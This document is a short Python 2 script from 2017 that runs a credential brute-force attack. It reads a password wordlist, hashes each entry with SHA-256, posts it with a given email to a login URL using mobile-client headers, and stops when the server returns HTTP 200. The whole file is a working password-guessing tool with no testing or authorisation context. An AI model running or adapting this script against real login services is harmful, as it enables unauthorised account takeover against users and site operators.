# -*- coding: utf-8 -*-
"""
Created on Mon Apr  3 09:28:23 2017

@author: lucgu
"""

import requests
import hashlib
import sys, getopt

def main(argv):
   username = ''
   password = ''
   link = ''
   try:
      opts, args = getopt.getopt(argv,"hu:p:l:",["ufile=","pfile=", "lfile="])
   except getopt.GetoptError:
      print 'test.py -u <username> -p <password>'
      print 'error'
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print 'test.py -i <username> -o <password>'
         sys.exit()
      elif opt in ("-u", "--ufile"):
         username = arg
      elif opt in ("-p", "--pfile"):
         password = arg  
      elif opt in ("-l", "--lfile"):
         link = arg

  
   with open(password) as f:
       content = f.readlines()
       line = content[0 : len(content)]
   content = [x.strip() for x in line] 
    
   headers = {'Content-type': 'application/json', 'User-Agent': 'Mobile', 'Cache-Control':'no-cache', 'Content-Length':'95', 'Connection':'Keep-Alive', 'Accept-Encoding':'gzip'}
    
   for each in content:
       hashedWord = hashlib.sha256(each).hexdigest()
       r = requests.post(link , json = {'email':username,'password':hashedWord}, headers=headers)
       respons = r.status_code
       print each, " : ", respons
       if(respons == 200):
           break
    
if __name__ == "__main__":
    main(sys.argv[1:])

